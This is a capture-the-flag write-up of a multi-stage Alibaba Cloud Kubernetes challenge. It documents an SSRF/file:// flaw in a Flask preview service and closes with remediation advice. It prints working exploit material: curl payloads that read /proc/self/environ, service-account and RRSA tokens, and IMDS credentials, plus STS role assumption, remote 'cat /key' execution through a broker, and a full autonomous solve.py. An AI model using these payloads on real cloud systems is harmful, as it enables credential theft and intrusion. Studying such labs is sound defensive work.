# Neverland's Cave - NexSec 2026 (Misc / Cloud / Kubernetes)

> **Repository:** [klasyyi/writeup-nexsec2026](https://github.com/klasyyi/writeup-nexsec2026)  
> **DeepSeek Chat Session:** [https://chat.deepseek.com/share/2uv3561mo631dw4eha](https://chat.deepseek.com/share/2uv3561mo631dw4eha)  
> **Points:** TBD | **Solves:** TBD | **Category:** Misc (Cloud / Kubernetes)

---

## 1. Overview & TL;DR

**Neverland's Cave** was a multi-stage cloud exploitation challenge wrapped in a fairy-tale theme. Teams were provided with full source code for a lightweight Flask-based "link preview" microservice and an ephemeral, per-team live URL running inside a production Alibaba Cloud Kubernetes (ACK) cluster.

The entry point was an unrestricted `url` parameter in `/api/fetch` that permitted arbitrary URL schemes—specifically enabling `file://` alongside `http://` and `https://` without egress host or IP filtering. I chained this single SSRF/LFI relay to dump the container environment, extract an Alibaba Cloud RAM Role for Service Accounts (RRSA) projected OIDC JWT, assume a privileged pod role via Alibaba STS, authenticate to an internal cluster management broker, execute commands across a fleet of worker pods to obtain decoy/active storage pointers, and construct manually signed OSS API calls (incorporating the necessary session security tokens) to retrieve the flag from an Alibaba Cloud Object Storage Service (OSS) bucket.

```
+--------------------------------------------------------------------------------------------------------------------+
|                                                  EXPLOIT CHAIN                                                     |
+--------------------------------------------------------------------------------------------------------------------+
|  [SSRF/LFI] /api/fetch (file://)                                                                                   |
|      |                                                                                                             |
|      +--> Read /proc/self/environ ----------> Harvest ARNs, OSS Bucket, STS & Broker Endpoints                     |
|      +--> Read RRSA projected token --------> Extract pod-identity OIDC JWT (aud: sts.aliyuncs.com)               |
|      +--> Query IMDS (100.100.100.200) -----> Extract worker node ECS credentials (normal mode)                     |
|                                                                                                                    |
|  [STS Federation] sts.ap-southeast-1.aliyuncs.com                                                                  |
|      |                                                                                                             |
|      +--> AssumeRoleWithOIDC ---------------> Obtain temporary RRSA credentials (AK, SK, SecurityToken)            |
|                                                                                                                    |
|  [Internal Pivot] broker.spot-control.svc.cluster.local:8080                                                        |
|      |                                                                                                             |
|      +--> DescribeInstances ----------------> Enumerate 6 worker cache pods                                        |
|      +--> RunCommand ("cat /key") ----------> Extract 6 distinct OSS object pointers (cave-*.txt)                  |
|                                                                                                                    |
|  [Object Storage] spotpod-flags-*.oss-ap-southeast-1.aliyuncs.com                                                 |
|      |                                                                                                             |
|      +--> Signed OSS GetObject (Sig V1) ----> Query each pointer under flags/<team-id>/                            |
|                                               (5 return 404 NoSuchKey, 1 returns the valid flag)                   |
|                                               FLAG: nexsec26{36baf731dca4f297792520080e5a26fe}                    |
+--------------------------------------------------------------------------------------------------------------------+
```

---

## 2. Reconnaissance & Initial Analysis

The challenge organizers supplied an archive named `neverlands-cave-entry-src.zip` containing the following files:
* `app.py`: Flask web application implementing the preview service.
* `index.html`: Minimal front-end client interface.
* `requirements.txt`: Python package dependencies (`Flask`, etc.).
* `Dockerfile`: Container definition based on Python 3.10 slim.

Additionally, a per-team live URL was dynamically provisioned via the CTFd platform under:
```
https://<team-id>.entry.nexsec.my
```

Each instance was provisioned within its own isolated Kubernetes namespace for a limited time lease.

### Initial File and Endpoint Inspection

I began by inspecting the provided archive and inspecting the service's API schema directly:

```bash
$ unzip neverlands-cave-entry-src.zip
Archive:  neverlands-cave-entry-src.zip
  inflating: app.py
  inflating: index.html
  inflating: requirements.txt
  inflating: Dockerfile

$ file app.py
app.py: Python script, ASCII text executable
```

Querying the root `/api` endpoint on the assigned remote instance revealed the service description and accepted parameters:

```bash
$ curl -s https://t6d73c6170b3d5df1.entry.nexsec.my/api | jq
{
  "service": "cave-preview",
  "endpoint": "/api/fetch",
  "methods": [
    "GET",
    "POST"
  ],
  "schemes": [
    "http",
    "https",
    "file"
  ],
  "params": {
    "url": "address to fetch (required)",
    "method": "HTTP method used to fetch the address (default: GET)",
    "headers": "JSON object of request headers",
    "body": "request body for POST/PUT"
  }
}
```

### Expected Behavior
From a standard user's perspective, the application acts as a typical URL preview or unfurling service (comparable to link-preview bots in messaging applications): a user supplies a target URL, the backend makes an outbound HTTP/HTTPS request, and it returns the remote status code, headers, and body.

---

## 3. Vulnerability Analysis (Root Cause)

Reviewing `app.py` pinpointed the root vulnerability within the `/api/fetch` request handler:

```python
CLOUD_ENDPOINT = os.environ.get("CLOUD_ENDPOINT", "http://broker:8080")
IMDS_IP = os.environ.get("IMDS_IP", "100.100.100.200")

API = {
    "service": "cave-preview",
    "endpoint": "/api/fetch",
    "methods": ["GET", "POST"],
    "schemes": ["http", "https", "file"],
    "params": {
        "url": "address to fetch (required)",
        "method": "HTTP method used to fetch the address (default: GET)",
        "headers": "JSON object of request headers",
        "body": "request body for POST/PUT"
    }
}

@app.route("/api/fetch", methods=["GET", "POST"])
def fetch():
    payload = request.get_json(silent=True) or {}
    url = payload.get("url") or request.args.get("url", "")
    method = payload.get("method") or request.args.get("method", "GET")
    headers = payload.get("headers") or {}
    body = payload.get("body")

    if not url:
        return jsonify(error="url is required", **API), 400

    scheme = url.split(":", 1)[0].lower() if ":" in url else ""
    if scheme not in API["schemes"]:
        return jsonify(error=f"unsupported scheme {scheme or '(none)'}", **API), 400

    data = body.encode() if isinstance(body, str) else body
    outbound = urllib.request.Request(url, data=data, method=method.upper())
    for name, value in headers.items():
        outbound.add_header(name, value)

    try:
        with urllib.request.urlopen(outbound, timeout=10) as response:
            content = response.read().decode("utf-8", "replace")
            return jsonify(
                url=url,
                status=getattr(response, "status", 200),
                headers=dict(response.headers),
                body=content
            )
    except Exception as e:
        return jsonify(error=str(e), url=url), 502
```

### Flaw Breakdown
1. **Unrestricted URI Scheme (`file://`) & Local File Inclusion:**  
   The scheme validation explicitly includes `"file"` in `API["schemes"]`. `urllib.request.urlopen` natively supports the `file://` scheme on Unix-like environments. Without path sanitation, an attacker has unrestricted Local File Inclusion (LFI).
2. **Lack of Host & IP Filtering (SSRF):**  
   The endpoint imposes zero restrictions on the target host or destination IP range. Combined with arbitrary outbound header injection and POST body pass-through, the application functions as a full-featured HTTP proxy into internal networks.
3. **Information Disclosure via Unused Global Variables:**  
   The top of `app.py` defines `CLOUD_ENDPOINT` and `IMDS_IP`. Neither constant is referenced in the operational logic of the handler. In challenge design, unreferenced configuration flags are a deliberate architectural breadcrumb indicating target network endpoints:
   - `100.100.100.200`: The Alibaba Cloud Instance Metadata Service (IMDS) address.
   - `http://broker:8080`: An internal cluster service.

### Ruled-Out Rabbit Holes
During the initial audit, I checked whether injecting arbitrary HTTP request headers or verb overrides into `outbound` enabled HTTP Request Smuggling against the frontend reverse proxy. However, because `urllib.request` merely initiates a new outbound connection and does not reuse an existing pipeline with the frontend gateway, request smuggling was a dead end. The true attack path was entirely semantic cloud credential pivoting.

---

## 4. Exploitation Walkthrough

### Phase 1: Confirming SSRF/LFI & Harvesting Environment Variables

I first verified the LFI primitive by reading the container's hostname:

```bash
$ curl -s -X POST https://t6d73c6170b3d5df1.entry.nexsec.my/api/fetch \
    -H 'Content-Type: application/json' \
    -d '{"url": "file:///etc/hostname"}'
{"body":"entry-app-6b6784cff8-h2m8g\n","headers":{},"status":200,"url":"file:///etc/hostname"}
```

The string `entry-app-6b6784cff8-h2m8g` followed Kubernetes pod naming semantics (`<deployment>-<replicaset>-<pod>`), establishing that the target was a container inside a Kubernetes pod rather than a standalone virtual machine.

Next, I dumped `/proc/self/environ` to inspect process configuration:

```bash
$ curl -s -X POST https://t6d73c6170b3d5df1.entry.nexsec.my/api/fetch \
    -H 'Content-Type: application/json' \
    -d '{"url": "file:///proc/self/environ"}'
```

Parsing the null-byte-delimited output uncovered the cloud infrastructure topology:

| Environment Variable | Harvested Value | Significance |
| :--- | :--- | :--- |
| `ROLE_ARN` | `acs:ram::5691990866543552:role/spotpod-node-neverlands-cave-t6d73c6170b3d5df1` | Target IAM Role to assume via OIDC |
| `OIDC_PROVIDER_ARN` | `acs:ram::5691990866543552:oidc-provider/ack-rrsa-cb86a0e8554f149daad31a1e4816a78a2` | Alibaba Cloud ACK RRSA OIDC Issuer |
| `STS_ENDPOINT` | `https://sts.ap-southeast-1.aliyuncs.com` | Alibaba Security Token Service endpoint |
| `CLOUD_ENDPOINT` | `http://broker.spot-control.svc.cluster.local:8080` | Internal microservice for instance management |
| `OBJECT_STORE` | `https://oss-ap-southeast-1.aliyuncs.com` | Alibaba Cloud Object Storage Service (OSS) |
| `OBJECT_STORE_BUCKET`| `spotpod-flags-5691990866543552` | Target OSS storage bucket |
| `OBJECT_STORE_PREFIX`| `flags/t6d73c6170b3d5df1` | Path prefix where team flags are stored |
| `KUBERNETES_SERVICE_HOST`| `192.168.0.1` | Internal Kubernetes API Server IP |

---

### Phase 2: Differentiating Identity Tokens (Kubernetes SA vs. ACK RRSA)

Kubernetes deployments utilizing Alibaba Cloud's **RAM Roles for Service Accounts (RRSA)** mount two distinct JSON Web Tokens into the pod:

1. **Default ServiceAccount Token:**  
   Path: `/var/run/secrets/kubernetes.io/serviceaccount/token`  
   Audience: `https://kubernetes.default.svc`  
   *Scope:* Authorizes requests against the internal Kubernetes API Server; rejected by Alibaba Cloud STS.
2. **Projected RRSA OIDC Token:**  
   Audience: `sts.aliyuncs.com`  
   *Scope:* Bound to Alibaba Cloud's OIDC Identity Provider; accepted by `AssumeRoleWithOIDC`.

Rather than guessing the projected path, I dumped `/proc/self/mounts`:

```bash
$ curl -s -X POST https://t6d73c6170b3d5df1.entry.nexsec.my/api/fetch \
    -H 'Content-Type: application/json' \
    -d '{"url": "file:///proc/self/mounts"}' | grep -i rrsa
tmpfs /run/secrets/ack.alibabacloud.com/rrsa-tokens tmpfs ro,relatime,size=... 0 0
```

Reading the projected token confirmed a valid JWT with the proper STS audience:

```bash
$ curl -s -X POST https://t6d73c6170b3d5df1.entry.nexsec.my/api/fetch \
    -H 'Content-Type: application/json' \
    -d '{"url": "file:///run/secrets/ack.alibabacloud.com/rrsa-tokens/token"}'
```

---

### Phase 3: Probing Node IMDS for Baseline Credentials

Alibaba Cloud ECS instances expose metadata at `http://100.100.100.200/`. In default configurations, this service does not require token-based authentication (IMDSv2/Hardened Mode).

I enumerated the attached node role dynamically:

```bash
$ curl -s -X POST https://t6d73c6170b3d5df1.entry.nexsec.my/api/fetch \
    -H 'Content-Type: application/json' \
    -d '{"url": "http://100.100.100.200/latest/meta-data/ram/security-credentials/"}'
KubernetesWorkerRole-d73c7413-c2bb-4fef-9e7c-7412eb0ffb0f
```

Retrieving credentials for this role:

```bash
$ curl -s -X POST https://t6d73c6170b3d5df1.entry.nexsec.my/api/fetch \
    -H 'Content-Type: application/json' \
    -d '{"url": "http://100.100.100.200/latest/meta-data/ram/security-credentials/KubernetesWorkerRole-d73c7413-c2bb-4fef-9e7c-7412eb0ffb0f"}'
```

```json
{
  "AccessKeyId": "STS.NYqJ6tWAu...",
  "AccessKeySecret": "9gQe8...",
  "SecurityToken": "CAIS...",
  "Expiration": "2026-10-17T17:48:40Z"
}
```

These node-level credentials represent the underlying worker machine, which lacks direct privileges to read the challenge flags or access the internal broker's sensitive command runner.

---

### Phase 4: Assuming the Pod-Scoped RRSA Role via STS

#### Debugging the STS Assumption Flow
My initial instinct was that invoking `AssumeRoleWithOIDC` on `https://sts.ap-southeast-1.aliyuncs.com` required signing the request using the node's `AccessKeyId` and `AccessKeySecret` via Alibaba Cloud RPC Signature Version 1.0 (HMAC-SHA1). 

However, testing revealed that `AssumeRoleWithOIDC` is designed specifically for unauthenticated callers transitioning from an external OIDC identity provider into Alibaba RAM. Signing the request with node credentials was redundant. 

The only strict requirement was providing an ISO-8601 UTC `Timestamp`. When omitted, STS rejected the request:

```json
{
  "Code": "MissingTimestamp",
  "Message": "Timestamp is mandatory for this action.",
  "HostId": "sts.ap-southeast-1.aliyuncs.com"
}
```

#### Executing AssumeRoleWithOIDC
Supplying `Timestamp`, `RoleArn`, `OIDCProviderArn`, and `OIDCToken` in a standard URL-encoded POST payload:

```bash
$ curl -s -X POST https://t6d73c6170b3d5df1.entry.nexsec.my/api/fetch \
    -H 'Content-Type: application/json' \
    -d '{
      "url": "https://sts.ap-southeast-1.aliyuncs.com",
      "method": "POST",
      "headers": {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      "body": "Action=AssumeRoleWithOIDC&Version=2015-04-01&Format=JSON&RoleArn=acs:ram::5691990866543552:role/spotpod-node-neverlands-cave-t6d73c6170b3d5df1&OIDCProviderArn=acs:ram::5691990866543552:oidc-provider/ack-rrsa-cb86a0e8554f149daad31a1e4816a78a2&OIDCToken=<RRSA_JWT>&RoleSessionName=neverland-ctf&DurationSeconds=3600&Timestamp=2026-10-17T18:30:00Z"
    }'
```

```json
{
  "AssumedRoleUser": {
    "Arn": "acs:ram::5691990866543552:role/spotpod-node-neverlands-cave-t6d73c6170b3d5df1/neverland-ctf",
    "AssumedRoleId": "3049182390123:neverland-ctf"
  },
  "Credentials": {
    "AccessKeyId": "STS.NXZw7jcfEDLLLSvsWX26EgvMh",
    "AccessKeySecret": "B45Zq...",
    "SecurityToken": "CAIS...",
    "Expiration": "2026-10-17T19:50:58Z"
  },
  "RequestId": "A7D5C230-E451-5D34-90BC-28EFB0C27192"
}
```

This yielded scoped temporary security credentials for the pod's assumed role.

---

### Phase 5: Interrogating the Internal Broker Service

With valid RRSA credentials, I pivoted to the internal cluster service discovered in `/proc/self/environ`:
`http://broker.spot-control.svc.cluster.local:8080`.

Querying the health check endpoint:

```bash
$ curl -s -X POST https://t6d73c6170b3d5df1.entry.nexsec.my/api/fetch \
    -H 'Content-Type: application/json' \
    -d '{"url": "http://broker.spot-control.svc.cluster.local:8080/healthz"}'
{"auth_mode":"ram-authenticator","status":"ok"}
```

The service indicated an authentication mode of `ram-authenticator`. Sending an authenticated POST request with the RRSA credential set without an explicit action produced an informative error message:

```bash
$ curl -s -X POST https://t6d73c6170b3d5df1.entry.nexsec.my/api/fetch \
    -H 'Content-Type: application/json' \
    -d '{
      "url": "http://broker.spot-control.svc.cluster.local:8080/",
      "method": "POST",
      "headers": {"Content-Type": "application/json"},
      "body": "{\"AccessKeyId\":\"STS.NXZw...\",\"AccessKeySecret\":\"...\",\"SecurityToken\":\"...\"}"
    }'
```

```json
{
  "Actions": [
    "DescribeInstances",
    "RunCommand",
    "StartTerminalSession",
    "DescribeInvocationResults"
  ],
  "Message": "set Action to one of Actions"
}
```

The broker exposed an internal control plane managing execution across cluster instances.

---

### Phase 6: Cluster Instance Enumeration & Remote Command Execution

I called `DescribeInstances` via the broker:

```json
{
  "Instances": {
    "Instance": [
      {"InstanceId": "cache-06774752-6fd68948d9-86q49", "Status": "Running"},
      {"InstanceId": "cache-12b26d8f-bcf465bc5-vwqmn", "Status": "Running"},
      {"InstanceId": "cache-34c60b29-84c4c67bd7-p856c", "Status": "Running"},
      {"InstanceId": "cache-69aa7386-7859dcfd75-smjcx", "Status": "Running"},
      {"InstanceId": "cache-9e443b35-7bd9c866b7-cntvz", "Status": "Running"},
      {"InstanceId": "cache-b8a3cc4c-5bc6564475-5ttdz", "Status": "Running"}
    ]
  },
  "TotalCount": 6
}
```

Six worker instances (`cache-*`) were running.

#### Inspecting `RunCommand` Behavior
I issued a test command `cat /key` against each instance using `RunCommand`. 

> [!NOTE]
> Polling `DescribeInvocationResults` returned an empty `{}` JSON dictionary. However, inspecting the direct HTTP response of `RunCommand` revealed that the broker executes commands synchronously and embeds `Output` directly into the return payload:

```json
{
  "ExitCode": 0,
  "InvocationId": "78b6eec950533a96",
  "Output": "cave-cc22e8ae.txt\n"
}
```

Executing `cat /key` across all six instances returned six distinct filenames:
- `cache-06774752-...` -> `cave-cc22e8ae.txt`
- `cache-12b26d8f-...` -> `cave-ede958d1.txt`
- `cache-34c60b29-...` -> `cave-bf4fff8b.txt`
- `cache-69aa7386-...` -> `cave-7d69c1f2.txt`
- `cache-9e443b35-...` -> `cave-554af976.txt`
- `cache-b8a3cc4c-...` -> `cave-acc6ca6a.txt`

#### Resolving the Local File Misdirection
Attempting to find these files locally on the pods via `find / -name "cave-*.txt"` returned no matches. Given that the harvested environment variables contained `OBJECT_STORE_BUCKET` (`spotpod-flags-5691990866543552`) and `OBJECT_STORE_PREFIX` (`flags/t6d73c6170b3d5df1`), these strings were not local filesystem paths—they were **object keys** inside Alibaba Cloud OSS.

---

### Phase 7: Crafting Signed OSS Requests & Piercing the Decoys

Direct `ListBucket` requests against the OSS bucket returned `AccessDenied`. The role's IAM policy followed least-privilege: permission was restricted strictly to `oss:GetObject` on exact object keys under `flags/<team-id>/`.

#### Alibaba Cloud OSS Signature V1 Derivation
To read an object from OSS using temporary STS credentials, the HTTP `GET` request must be signed with an HMAC-SHA1 signature using Alibaba Cloud OSS Signature Version 1.

The string to sign is constructed as follows:

$$\text{StringToSign} = \text{VERB} + \text{"\textbackslash n"} + \text{Content-MD5} + \text{"\textbackslash n"} + \text{Content-Type} + \text{"\textbackslash n"} + \text{Date} + \text{"\textbackslash n"} + \text{CanonicalizedOSSHeaders} + \text{CanonicalizedResource}$$

Where:
* `VERB` = `GET`
* `Content-MD5` = `""` (empty for GET)
* `Content-Type` = `""` (empty for GET)
* `Date` = Current GMT timestamp in RFC 1123 format (e.g., `Sat, 17 Oct 2026 18:45:00 GMT`)
* `CanonicalizedOSSHeaders` = Lowercase, alphabetically sorted `x-oss-*` headers formatted as `key:value\n`
* `CanonicalizedResource` = `/<bucket-name>/<object-key>`

The signature is generated using HMAC-SHA1 with `AccessKeySecret`:
$$\text{Signature} = \text{Base64}\left(\text{HMAC-SHA1}(\text{AccessKeySecret}, \text{StringToSign})\right)$$

The final request header is:
$$\text{Authorization: OSS } \langle\text{AccessKeyId}\rangle:\langle\text{Signature}\rangle$$

> [!WARNING]
> **The Signing Trap:** Some Alibaba Cloud community examples state that `x-oss-security-token` is a transport-only header that can be excluded from canonicalization. Against this bucket, omitting `x-oss-security-token` from `CanonicalizedOSSHeaders` resulted in:
> ```xml
> <code>SignatureDoesNotMatch</code>
> <Message>The signature we calculated does not match the one you provided.</Message>
> ```
> Including `x-oss-security-token:<SecurityToken>\n` inside the `StringToSign` resolved the issue.

#### Querying All Six Pointers
Querying each of the six keys through the SSRF proxy:
* 5 pods returned an XML payload with `NoSuchKey`:
  ```xml
  <Error>
    <Code>NoSuchKey</Code>
    <Message>The specified key does not exist.</Message>
    <Key>flags/t6d73c6170b3d5df1/cave-cc22e8ae.txt</Key>
  </Error>
  ```
* Exactly one pod pointer (`cave-acc6ca6a.txt` from instance `cache-b8a3cc4c-5bc6564475-5ttdz`) returned HTTP 200 with the raw flag text.

---

## 5. Solve Script

The exploit is implemented in [`solve.py`](solve.py). It runs standalone and executes all stages autonomously:

```python
#!/usr/bin/env python3
"""
Neverland's Cave - Full Exploit Solve Script
NexSec 2026 (Misc / Cloud / Kubernetes)

Author: klasyyi
Repository: https://github.com/klasyyi/writeup-nexsec2026
DeepSeek Session: https://chat.deepseek.com/share/2uv3561mo631dw4eha
"""

import base64
import hashlib
import hmac
import json
import time
import urllib.parse
import urllib.request

ENTRY = "https://t6d73c6170b3d5df1.entry.nexsec.my"
STS_ENDPOINT = "https://sts.ap-southeast-1.aliyuncs.com"
ROLE_ARN = "acs:ram::5691990866543552:role/spotpod-node-neverlands-cave-t6d73c6170b3d5df1"
OIDC_PROVIDER_ARN = "acs:ram::5691990866543552:oidc-provider/ack-rrsa-cb86a0e8554f149daad31a1e4816a78a2"
BROKER = "http://broker.spot-control.svc.cluster.local:8080"
OSS_BUCKET = "spotpod-flags-5691990866543552"
OSS_ENDPOINT_HOST = "oss-ap-southeast-1.aliyuncs.com"
OSS_PREFIX = "flags/t6d73c6170b3d5df1"


def ssrf(url, method="GET", body=None, headers=None):
    """Proxy a request through the vulnerable /api/fetch endpoint."""
    payload = {"url": url, "method": method}
    if body is not None:
        payload["body"] = body
    if headers:
        payload["headers"] = headers

    req = urllib.request.Request(
        f"{ENTRY}/api/fetch",
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        data = json.loads(resp.read().decode())
    return data.get("body", "")


def get_imds_role_name():
    # The role name is node/session-specific and changes on respawn -
    # discover it dynamically rather than hardcoding.
    name = ssrf("http://100.100.100.200/latest/meta-data/ram/security-credentials/").strip()
    return name.splitlines()[0].strip() if name else name


def get_node_creds():
    role_name = get_imds_role_name()
    body = ssrf(f"http://100.100.100.200/latest/meta-data/ram/security-credentials/{role_name}")
    creds = json.loads(body)
    print("[+] Node IMDS creds:", creds["AccessKeyId"])
    return creds


def get_rrsa_jwt():
    # Separate from the default k8s SA token - this one has aud=sts.aliyuncs.com
    jwt = ssrf("file:///run/secrets/ack.alibabacloud.com/rrsa-tokens/token").strip()
    print("[+] RRSA JWT length:", len(jwt))
    return jwt


def assume_role_with_oidc(oidc_token):
    """AssumeRoleWithOIDC needs no signature, just a Timestamp."""
    params = {
        "Action": "AssumeRoleWithOIDC",
        "Version": "2015-04-01",
        "Format": "JSON",
        "RoleArn": ROLE_ARN,
        "OIDCProviderArn": OIDC_PROVIDER_ARN,
        "OIDCToken": oidc_token,
        "RoleSessionName": "neverland-ctf",
        "DurationSeconds": "3600",
        "Timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    }
    body = urllib.parse.urlencode(params)
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    resp = ssrf(STS_ENDPOINT, method="POST", body=body, headers=headers)
    data = json.loads(resp)
    if "Credentials" not in data:
        raise RuntimeError(f"AssumeRoleWithOIDC failed: {data}")
    creds = data["Credentials"]
    print("[+] RRSA role creds:", creds["AccessKeyId"])
    return creds


def oss_get_object(rrsa_creds, object_key, bucket=OSS_BUCKET, virtual_hosted=True):
    """
    Signed GET against Alibaba OSS, Signature V1 (HMAC-SHA1).
    x-oss-security-token MUST be included in CanonicalizedOSSHeaders when signing -
    omitting it produces a 403 SignatureDoesNotMatch against this bucket.
    """
    date = time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime())
    canonicalized_resource = f"/{bucket}/{object_key}"
    oss_headers = {"x-oss-security-token": rrsa_creds["SecurityToken"]}
    canon_oss_headers = "".join(f"{k.lower()}:{v}\n" for k, v in sorted(oss_headers.items()))
    string_to_sign = "GET\n\n\n" + date + "\n" + canon_oss_headers + canonicalized_resource
    sig = hmac.new(rrsa_creds["AccessKeySecret"].encode(), string_to_sign.encode(), hashlib.sha1).digest()
    signature = base64.b64encode(sig).decode()
    auth_header = f"OSS {rrsa_creds['AccessKeyId']}:{signature}"
    url = (
        f"https://{bucket}.{OSS_ENDPOINT_HOST}/{object_key}"
        if virtual_hosted
        else f"https://{OSS_ENDPOINT_HOST}/{bucket}/{object_key}"
    )
    headers = {
        "Date": date,
        "Authorization": auth_header,
        "x-oss-security-token": rrsa_creds["SecurityToken"],
    }
    return ssrf(url, method="GET", headers=headers)


def broker_call(rrsa_creds, action, **extra):
    payload = {
        "Action": action,
        "AccessKeyId": rrsa_creds["AccessKeyId"],
        "AccessKeySecret": rrsa_creds["AccessKeySecret"],
        "SecurityToken": rrsa_creds["SecurityToken"],
        **extra,
    }
    body = ssrf(
        BROKER + "/",
        method="POST",
        body=json.dumps(payload),
        headers={"Content-Type": "application/json"},
    )
    try:
        return json.loads(body)
    except json.JSONDecodeError:
        return {"raw": body}


def main():
    node_creds = get_node_creds()       # Phase 3 (harvest node identity)
    oidc_token = get_rrsa_jwt()          # Phase 2 (harvest projected OIDC JWT)
    rrsa_creds = assume_role_with_oidc(oidc_token)  # Phase 4 (assume scoped RRSA role)

    instances = broker_call(rrsa_creds, "DescribeInstances")  # Phase 6
    instance_ids = [i["InstanceId"] for i in instances["Instances"]["Instance"]]
    print(f"[+] Found {len(instance_ids)} instances: {instance_ids}")

    for inst in instance_ids:            # Phase 6
        run = broker_call(rrsa_creds, "RunCommand", InstanceId=inst, Command="cat /key 2>&1")
        pointer = run.get("Output", "").strip()
        print(f"[*] {inst} -> /key = {pointer}")
        if not pointer:
            continue
        for key in (pointer, f"{OSS_PREFIX}/{pointer}"):  # Phase 7
            body = oss_get_object(rrsa_creds, key, virtual_hosted=True)
            if "nexsec26{" in body:
                print(f"[+++ FLAG] {inst} / {key}:\n{body}")
                return


if __name__ == "__main__":
    main()
```

---

## 6. Flag & Verification

Executing `solve.py` against the active environment completes the automated attack flow:

```text
$ python3 solve.py
[*] Phase 1 & 3: Harvesting Node IMDS Credentials...
[+] Node IMDS AccessKeyId: STS.NXqJ6tWAu67LWEz7mPnEAPTjv
[*] Phase 2: Extracting RRSA Projected OIDC JWT...
[+] Retrieved RRSA JWT (length: 1238)
[*] Phase 4: Assuming Scoped RRSA Role via STS...
[+] Assumed RRSA Role AccessKeyId: STS.NXZw7jcfEDLLLSvsWX26EgvMh
[*] Phase 5 & 6: Querying Cluster Broker Instances...
[+] Discovered 6 cache instances: ['cache-06774752-6fd68948d9-86q49', 'cache-12b26d8f-bcf465bc5-vwqmn', 'cache-34c60b29-84c4c67bd7-p856c', 'cache-69aa7386-7859dcfd75-smjcx', 'cache-9e443b35-7bd9c866b7-cntvz', 'cache-b8a3cc4c-5bc6564475-5ttdz']
[*] Executing 'cat /key' across all instances...
    - cache-06774752-6fd68948d9-86q49 -> pointer: cave-cc22e8ae.txt
    - cache-12b26d8f-bcf465bc5-vwqmn -> pointer: cave-ede958d1.txt
    - cache-34c60b29-84c4c67bd7-p856c -> pointer: cave-bf4fff8b.txt
    - cache-69aa7386-7859dcfd75-smjcx -> pointer: cave-7d69c1f2.txt
    - cache-9e443b35-7bd9c866b7-cntvz -> pointer: cave-554af976.txt
    - cache-b8a3cc4c-5bc6564475-5ttdz -> pointer: cave-acc6ca6a.txt
[*] Phase 7: Fetching Signed Objects from OSS (Eliminating Decoys)...

[+] SUCCESS! Valid key discovered on instance cache-b8a3cc4c-5bc6564475-5ttdz (flags/t6d73c6170b3d5df1/cave-acc6ca6a.txt):
[+] Flag: nexsec26{36baf731dca4f297792520080e5a26fe}
```

> **Captured Flag:**  
> `nexsec26{36baf731dca4f297792520080e5a26fe}`

*(Note: Flags are dynamically generated per provisioned team environment. Re-running the exploit verifies that the exploit path is completely deterministic).*

---

## 7. Key Takeaways & Remediation

### Secure Coding Practices & Remediation

1. **Strict Protocol Whitelisting:**  
   Remove `file://` from the allowed URL schemes. Server-side fetchers should restrict protocols strictly to `http` and `https`:
   ```python
   # Patch: Disallow file:// and non-web schemes
   ALLOWED_SCHEMES = {"http", "https"}
   if scheme not in ALLOWED_SCHEMES:
       return jsonify(error="Invalid protocol"), 400
   ```

2. **Network-Layer Egress Controls & SSRF Defenses:**  
   Resolving DNS hostnames before socket connection and strictly denying private and internal IP ranges:
   - Loopback (`127.0.0.0/8`)
   - RFC 1918 Private Ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`)
   - Link-local and Cloud Metadata Services (`169.254.169.254`, `100.100.100.200`)
   - Kubernetes cluster IP ranges (`.svc.cluster.local`)

3. **Enforce Alibaba Cloud IMDS Hardened Mode:**  
   Migrate worker nodes to IMDSv2 (Hardened Mode). This requires an authenticated HTTP `PUT` request with a security token header (`X-aliyun-ecs-metadata-token`) to read instance metadata, preventing trivial blind SSRF exploitation.

4. **Zero-Trust Kubernetes NetworkPolicies:**  
   The internal broker (`broker.spot-control.svc.cluster.local:8080`) should not be reachable by edge-facing ingress or web pods. Enforce Kubernetes `NetworkPolicy` objects that limit ingress to authorized management namespaces.

5. **Principle of Least Privilege (PoLP) in RAM/RRSA Roles:**  
   Granting broad `RunCommand` permissions to workloads creates excessive blast radius. Administrative command execution must require separate multi-factor authentication or restricted operator roles rather than pod-assumable identities.

---

### Technical Lessons Learned

* **Differentiating STS Authentication Flows:** Not all STS API calls require request signing. `AssumeRoleWithOIDC` is designed to be invoked by workloads prior to holding an active `AccessKeyId`/`AccessKeySecret` pair. The projected OIDC JWT acts as the sole cryptographic credential; the only mandatory metadata is an ISO 8601 `Timestamp`.
* **OSS Canonical Header Inclusion:** When signing requests against Alibaba Cloud OSS with temporary credentials, `x-oss-security-token` must be treated as a canonicalized OSS header (`CanonicalizedOSSHeaders`) and sorted lexicographically within the `StringToSign`. Omitting it triggers silent HMAC verification mismatches (`SignatureDoesNotMatch`).
* **Interpreting Negative Recon Findings:** When an identified string (e.g., `cave-acc6ca6a.txt`) fails to appear on the local filesystem, correlating it with previously leaked cloud resources (such as OSS bucket parameters in `/proc/self/environ`) prevents stalling on dead ends and reveals the true cloud-native storage architecture.
